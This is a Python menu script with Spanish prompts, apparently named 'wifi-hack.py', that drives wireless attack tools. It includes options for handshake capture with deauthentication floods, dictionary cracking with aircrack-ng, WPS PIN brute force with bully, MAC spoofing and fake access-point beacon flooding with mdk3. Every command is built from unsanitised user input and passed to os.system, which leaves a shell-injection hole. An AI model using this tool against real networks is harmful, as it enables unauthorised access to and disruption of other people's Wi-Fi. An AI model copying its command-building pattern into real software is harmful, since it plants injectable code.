from banner.banner import *


def slowly(s):
  try:
    time.sleep(1)
    for w in s + '\n' :
      sys.stdout.write(w)
      sys.stdout.flush()
      time.sleep(7. / 100)
    print('\n')
    time.sleep(2)
  except KeyboardInterrupt:
    time.sleep(1)
    slowly(FAIL+'Exiting...')
    print('\n')
    sys.exit(0)

############################################################

print(" \033[1;37mIntroduzca una opción: ")
WH = int(input(" \033[1;32m>> \033[1;37m"))

if WH == 1:
	os.system("clear")
	banner()
	print(" \033[1;37mIngrese la interfaz: (\033[0;37mwlan\033[0;31m0 \033[1;37m| \033[0;37mwlan\033[0;34m1\033[1;37m)")
	interfaz = input(" \033[1;32m>> \033[0;37m")
	comando = "airmon-ng start {} && airmon-ng check kill".format(interfaz)
	os.system(comando)
	os.system("python3 wifi-hack.py")

elif WH == 2:
    os.system("clear")
    banner()
    print(" \033[1;37mIngrese la interfaz: (\033[0;37mwlan\033[0;31m0\033[0;37mmon \033[1;37m| \033[0;37mwlan\033[0;34m1\033[0;37mmon\033[1;37m)\033[0m")
    interfaz = input(" \033[1;32m>> \033[0;37m")
    comando = "airmon-ng stop {}".format(interfaz)  
    os.system(comando)
    os.system("python3 wifi-hack.py")

elif WH == 3:
	os.system("clear")
	print("\n\033[0m")
	os.system("sudo ifconfig")
	time.sleep(3)
	os.system("clear")
	os.system("python3 wifi-hack.py")

elif WH == 4:
    os.system("clear")
    banner()
    slowly(" \033[1;37mReiniciando red, por favor, espere...\033[0m")
    comando = "service networking restart && systemctl start NetworkManager"
    os.system(comando)
    print(" \033[1;31mProceso finalizado!\033[0m")
    time.sleep(2)
    os.system("clear")
    os.system("python3 wifi-hack.py")


elif WH == 5:
    os.system("clear")
    banner()
    print(" \033[1;37mIngrese la interfaz: (\033[0;37mwlan\033[0;31m0\033[0;37mmon \033[1;37m| \033[0;37mwlan\033[0;34m1\033[0;37mmon\033[1;37m)\033[0m")
    interfaz = input(" \033[1;32m>> \033[0;37m")
    print("\033[1;37mIngrese el nombre del archivo de salida: (Ej: \033[0;31mredes-output\033[0m\033[1;37m)\033[0m")
    archivo_salida = input(" \033[1;32m>> \033[0;37m")
    comando = "airodump-ng --write scan-output/{} --output-format csv  {}".format(archivo_salida,interfaz)
    print("\n \033[1;31m[AVISO] \033[0;37mCuando termine, presione \033[1;37mCTRL + C\033[0m")
    time.sleep(3)
    try:
        os.system(comando)
    except KeyboardInterrupt:
        print("\n\n \033[1;31m[AVISO] \033[0;37Escaneo detenido, guardando resultados...\033[0m")
        time.sleep(2)
    finally:
        time.sleep(3)
        print("\n\033[1;37mLos datos se han guarado en: \033[0;37mscan-output/\033[0;32m{}01.csv\033[0m".format(archivo_salida))
        
        print("\033[1;37m¿Desea volver al menú principal? (\033[0;32ms\033[0;37m/\033[0;31mn\033[1;37m):\033[0m")
        volver = input(" \033[1;32m>> \033[0;37m").strip().lower()
        if volver != 's':
            print("\n\033[1;31m[GOODBYE]\033[0m Saliendo del programa...")
            time.sleep(1)
            exit(0)
        else:
            os.system('python3 wifi-hack.py')  

elif WH == 6:
    os.system("clear")
    banner()
    print(" \033[1;37mIngrese la interfaz: (\033[0;37mwlan\033[0;31m0\033[0;37mmon \033[1;37m| \033[0;37mwlan\033[0;34m1\033[0;37mmon\033[1;37m)\033[0m")
    interfaz = input(" \033[1;32m>> \033[0;37m")
    comando = "airodump-ng {}".format(interfaz)
    print("\n \033[1;31m[AVISO] \033[0;37mCuando termine, presione \033[1;37mCTRL + C\033[0m")
    time.sleep(2)
    os.system(comando)
    print("\n Ingrese el \033[1;32mBSSID\033[0m del objetivo:")
    bssid = str(input(" \033[1;32m>> \033[0;37m"))
    print("\n Ingrese el \033[1;32mCHANNEL\033[0m del objetivo:")
    channel = int(input(" \033[1;32m>> \033[0;37m"))
    print("\n Ingrese la \033[1;32mRUTA\033[0m donde desea guardar el handshake:")
    ruta = str(input(" \033[1;32m>> \033[0;37m"))
    print("\n Ingrese el número de paquetes (max 10000 | min 0):")
    paquetes = int(input(" \033[1;32m>> \033[0;37m"))
    comando = "airodump-ng -c {} --bssid {} -w {} {} | xterm -e aireplay-ng -0 {} -a {} {}".format(channel,bssid,ruta,interfaz,paquetes,bssid,interfaz)
    os.system(comando)
    time.sleep(2)
    os.system("clear")
    os.system("python3 wifi-hack.py")

elif WH == 7:
    os.system("clear")
    banner()
    print(" \033[1;37mIngrese el handshake:\033[0m")
    ruta = str(input(" \033[1;32m>> \033[0;37m"))
    print("")
    print(" \033[1;37mIngrese el diccionario:\033[0m")
    diccionario = str(input(" \033[1;32m>> \033[0;37m"))
    comando = "aircrack-ng {} -w {}".format(ruta,diccionario)
    os.system(comando)
    exit()

elif WH == 8:
    os.system("clear")
    banner()
    print(" \033[1;37mIngrese la interfaz: (\033[0;37mwlan\033[0;31m0\033[0;37mmon \033[1;37m| \033[0;37mwlan\033[0;34m1\033[0;37mmon\033[1;37m)\033[0m")
    interfaz = input(" \033[1;32m>> \033[0;37m")
    print(" \033[1;37mIngrese el BSSID del AP:")
    bssid = input(" \033[1;32m>> \033[0;37m")
    print(" \033[1;37mIngrese el canal del AP:")
    channel = input(" \033[1;32m>> \033[0;37m")
    print(" \033[1;37mIngrese el ESSID del AP:")
    essid = input(" \033[1;32m>> \033[0;37m")
    comando = "bully {} -b {} -c {} -e {} --force".format(interfaz, bssid, channel, essid)
    os.system(comando)

elif WH == 9:
    os.system("clear")
    banner()
    print(" \033[1;37mIntroduzca la interfaz: (\033[0;37mwlan\033[0;31m0 \033[1;37m| \033[0;37mwlan\033[0;34m1\033[1;37m)")
    interface = input(" \033[1;32m>> \033[0;37m")
    nuevaMAC= input("Introduzca la nueva dirección MAC: \033[1;32m>> \033[0;37m")
    os.system(f"ifconfig {interface} down")
    print(f"Cambiando la MAC de la interfaz {interface} a {nuevaMAC}")
    os.system(f"ifconfig {interface} hw ether {nuevaMAC}")
    print(f"La dirección MAC cambio a: {nuevaMAC}")
    os.system(f"ifconfig {interface} up")
    print("La interfaz esta lista!")
    time.sleep(1)
    os.system(f"ifconfig {interface}")
    time.sleep(4)
    os.system("clear")
    os.system("python3 wifi-hack.py")    

elif WH == 10:
    os.system('clear')
    banner()
    print(" \033[1;37mIntroduzca la interfaz: (\033[0;37mwlan\033[0;31m0 \033[1;37m| \033[0;37mwlan\033[0;34m1\033[1;37m)")
    interface = input(" \033[1;32m>> \033[0;37m")
    print(" \033[1;37mIntroduzca el canal:")
    channel = input(" \033[1;32m>> \033[0;37m")
    print(" \033[1;37m¿Desea crear un diccionario de AP falsas? [\033[1;32my\033[0m/\033[1;31mn\033[0m]\033[0m")
    crearDic = input(" \033[1;32m>> \033[0;37m")
    if crearDic == 'y':
        os.system('sudo bash AP_generator.sh')

    elif crearDic == 'n':
        pass    

    print("\n\033[1;37m Ingrese la ruta del diccionario\033[0m (default: \033[1;37m/wordlist/fakeAP.txt\033[0m): ")
    diccionario = str(input(" \033[1;32m>> \033[0;37m"))
    print("\n \033[1;31m[AVISO] \033[0;37mPresione \033[1;37m\033[1;37mCTRL + C \033[0;37mpara detener el ataque\033[0m")
    os.system("mdk3 {} b -f {} -a -s 1000 -c {}".format(interface,diccionario,channel))
    time.sleep(2)   

elif WH == 0:
    os.system("clear")
    goodbye()
    exit() 

#END CODE       
#Follow me: https://github.com/R3LI4NT
